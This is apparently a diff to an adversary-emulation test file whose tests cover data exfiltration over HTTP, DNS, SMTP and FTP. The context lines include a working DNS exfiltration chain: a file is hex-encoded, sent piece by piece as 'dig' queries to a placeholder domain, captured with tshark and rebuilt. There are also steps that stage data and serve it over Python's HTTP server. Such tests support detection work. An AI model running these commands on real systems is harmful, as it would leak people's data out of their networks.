@@ -4,7 +4,7 @@ atomic_tests:
 - name: Exfiltration Over Alternative Protocol - HTTP
   auto_generated_guid: 1d1abbd6-a3d3-4b2e-bef5-c59293f46eff
   description: |
-    A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
+    A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
     Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
   supported_platforms:
@@ -57,12 +57,12 @@ atomic_tests:
     steps: |
       1. On the adversary machine run the below command.
 
-          tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" >> received_data.txt
+          tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\".domain\\"" >> received_data.txt
 
       2. On the victim machine run the below commands.
 
           xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
-          
+
       3. Once the data is received, use the below command to recover the data.
 
           cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
@@ -92,7 +92,7 @@ atomic_tests:
   auto_generated_guid: ec3a835e-adca-4c7c-88d2-853b69c11bb9
   description: |
     Exfiltration of specified file over SMTP.
-    Upon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.
+    Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.
   supported_platforms:
   - windows
   executor:
@@ -181,7 +181,7 @@ atomic_tests:
       default: dlpuser
     ftp_port:
       description: Your FTP's port
-      type: string
+      type: integer
       default: 21
   dependency_executor_name: powershell
   dependencies:
@@ -215,4 +215,5 @@ atomic_tests:
     name: sh
     elevation_required: false
     command: |
+      [ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
       if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
